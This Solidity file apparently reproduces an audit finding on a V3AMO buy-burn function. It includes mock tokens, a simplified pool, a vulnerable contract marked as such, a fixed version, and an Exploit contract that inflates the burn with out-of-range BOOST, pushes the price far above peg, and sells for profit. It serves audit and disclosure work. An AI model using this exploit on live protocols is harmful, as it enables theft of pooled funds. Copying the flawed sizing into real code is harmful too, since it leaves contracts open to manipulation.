// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  AXION — V3AMO._unfarmBuyBurn sizes the burn from token balances
    (Sherlock 2024-10, issue 114). LIQUIDITY_COEFF is 995000 and FACTOR is 1e6,
    copied from V3AMO / MasterAMO. A V3 position can be boost-only, so
    balanceOf(boost) and liquidity() rise while slot0 does not. The active
    pool is 1000 BOOST and 900 USD (spot 0.9). Adding 1000 BOOST out of range
    makes the formula burn 754.827586206896551724 liquidity instead of
    52.368421052631578946. The buyback prints a spot of 14.972671758443269419.
    Selling 100 BOOST that was bought at 0.9 returns 562.115258506922654752 USD.
    Paying the 90 USD cost leaves 472.115258506922654752. The control sizes the
    burn from the active reserves only and stops at spot 1.002220911050889085. */

contract Boost {
    string public symbol = "BOOST";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Usd {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Boost public boost;
    Usd public usd;
    uint256 public activeBoost;
    uint256 public activeUsd;
    uint256 public sideBoost;
    uint256 public activeLiquidity;
    uint256 public totalLiquidity;

    constructor(Boost _boost, Usd _usd) {
        boost = _boost;
        usd = _usd;
    }

    function liquidity() external view returns (uint256) {
        return totalLiquidity;
    }

    function spotPrice() public view returns (uint256) {
        return activeUsd * 1e18 / activeBoost;
    }

    function seed(uint256 b, uint256 u) external {
        boost.transferFrom(msg.sender, address(this), b);
        usd.transferFrom(msg.sender, address(this), u);
        activeBoost = b;
        activeUsd = u;
        activeLiquidity = b;
        totalLiquidity = b;
    }

    function addSideBoost(uint256 amount) external {
        boost.transferFrom(msg.sender, address(this), amount);
        sideBoost += amount;
        totalLiquidity += amount;
    }

    function burnAndBuy(uint256 burnAmt) external returns (uint256 priceAfter) {
        require(burnAmt <= activeLiquidity && burnAmt != 0, "burn");
        uint256 bRem = activeBoost * burnAmt / activeLiquidity;
        uint256 uRem = activeUsd * burnAmt / activeLiquidity;
        activeBoost -= bRem;
        activeUsd -= uRem;
        activeLiquidity -= burnAmt;
        totalLiquidity -= burnAmt;
        boost.transfer(msg.sender, bRem);
        usd.transfer(msg.sender, uRem);
        usd.transferFrom(msg.sender, address(this), uRem);
        uint256 k = activeBoost * activeUsd;
        uint256 newUsd = activeUsd + uRem;
        uint256 newBoost = k / newUsd;
        uint256 boostOut = activeBoost - newBoost;
        activeUsd = newUsd;
        activeBoost = newBoost;
        boost.transfer(msg.sender, boostOut);
        priceAfter = spotPrice();
    }

    function sellBoost(uint256 boostIn) external returns (uint256 usdOut) {
        boost.transferFrom(msg.sender, address(this), boostIn);
        uint256 k = activeBoost * activeUsd;
        uint256 newBoost = activeBoost + boostIn;
        uint256 newUsd = k / newBoost;
        usdOut = activeUsd - newUsd;
        activeBoost = newBoost;
        activeUsd = newUsd;
        usd.transfer(msg.sender, usdOut);
    }
}

contract V3Amo {
    uint256 internal constant LIQUIDITY_COEFF = 995000;
    uint256 internal constant FACTOR = 1_000_000;
    Boost public boost;
    Usd public usd;
    Pool public pool;
    uint256 public lastLiquidity;
    uint256 public lastPrice;

    constructor(Boost _boost, Usd _usd, Pool _pool) {
        boost = _boost;
        usd = _usd;
        pool = _pool;
    }

    function unfarmBuyBurn() external returns (uint256 liquidity, uint256 newBoostPrice) {
        uint256 totalLiquidity = pool.liquidity();
        uint256 boostBalance = boost.balanceOf(address(pool));
        uint256 usdBalance = usd.balanceOf(address(pool));
        require(boostBalance > usdBalance, "PriceNotInRange");
        lastLiquidity = (totalLiquidity * (boostBalance - usdBalance)) / (boostBalance + usdBalance); // @> VULN: balances count out-of-range BOOST, so the burn is not the distance to peg
        lastLiquidity = (lastLiquidity * LIQUIDITY_COEFF) / FACTOR;
        liquidity = lastLiquidity;
        usd.approve(address(pool), type(uint256).max);
        newBoostPrice = pool.burnAndBuy(liquidity);
        lastPrice = newBoostPrice;
        uint256 got = boost.balanceOf(address(this));
        if (got != 0) boost.transfer(address(0x000000000000000000000000000000000000dEaD), got);
    }
}

contract V3AmoFixed {
    uint256 internal constant LIQUIDITY_COEFF = 995000;
    uint256 internal constant FACTOR = 1_000_000;
    Usd public usd;
    Pool public pool;
    uint256 public lastLiquidity;
    uint256 public lastPrice;

    constructor(Usd _usd, Pool _pool) {
        usd = _usd;
        pool = _pool;
    }

    function unfarmBuyBurn() external returns (uint256 liquidity, uint256 newBoostPrice) {
        uint256 totalLiquidity = pool.activeLiquidity();
        uint256 boostBalance = pool.activeBoost();
        uint256 usdBalance = pool.activeUsd();
        require(boostBalance > usdBalance, "PriceNotInRange");
        liquidity = (totalLiquidity * (boostBalance - usdBalance)) / (boostBalance + usdBalance);
        liquidity = (liquidity * LIQUIDITY_COEFF) / FACTOR;
        usd.approve(address(pool), type(uint256).max);
        newBoostPrice = pool.burnAndBuy(liquidity);
        lastLiquidity = liquidity;
        lastPrice = newBoostPrice;
    }
}

contract Exploit {
    Boost public boost; // nonce 1
    Usd public usd; // nonce 2
    Pool public pool; // nonce 3
    V3Amo public amo; // nonce 4
    uint256 public priceAfter;
    uint256 public burned;
    uint256 public usdOut;
    uint256 public profit;

    constructor() {
        boost = new Boost();
        usd = new Usd();
        pool = new Pool(boost, usd);
        amo = new V3Amo(boost, usd, pool);
    }

    function run() external {
        boost.mint(address(this), 1000 ether + 1000 ether + 100 ether);
        usd.mint(address(this), 900 ether);
        boost.approve(address(pool), type(uint256).max);
        usd.approve(address(pool), type(uint256).max);
        pool.seed(1000 ether, 900 ether);
        require(pool.spotPrice() == 0.9 ether, "spot 0.9");
        pool.addSideBoost(1000 ether);
        require(pool.spotPrice() == 0.9 ether, "spot unchanged");
        require(boost.balanceOf(address(pool)) == 2000 ether, "2000 boost");
        amo.unfarmBuyBurn();
        burned = amo.lastLiquidity();
        priceAfter = amo.lastPrice();
        require(burned == 754827586206896551724, "overburn");
        require(priceAfter == 14972671758443269419, "price above peg");
        usdOut = pool.sellBoost(100 ether);
        require(usdOut == 562115258506922654752, "sale");
        usd.transfer(address(0x000000000000000000000000000000000000dEaD), 90 ether);
        profit = usd.balanceOf(address(this));
        require(profit == 472115258506922654752, "profit");
    }
}
